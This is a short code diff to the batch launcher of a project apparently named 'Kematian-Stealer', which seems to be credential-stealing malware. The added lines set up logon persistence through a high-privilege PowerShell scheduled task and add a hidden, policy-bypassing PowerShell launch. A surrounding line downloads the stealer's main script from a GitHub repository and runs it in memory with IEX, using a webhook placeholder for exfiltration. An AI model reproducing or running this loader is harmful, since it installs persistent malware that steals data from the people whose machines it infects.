@@ -12,7 +12,8 @@ if not exist %pathplz% (
 )
 
 copy %~f0 %pathplz%\Kematian.bat >nul
-schtasks /Create /TN "Kematian" /TR "cmd.exe /c '%USERPROFILE%\Appdata\Roaming\Kematian\Kematian.bat'" /SC ONLOGON /RU SYSTEM /F >nul
+powershell -c "$task_name = 'Kematian';$task_action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c %%appdata%%\Kematian\Kematian.bat';$task_trigger = New-ScheduledTaskTrigger -AtLogOn;$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable;Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description 'Kematian' -RunLevel Highest -Force"
+::vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)
 
 powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | IEX"
 
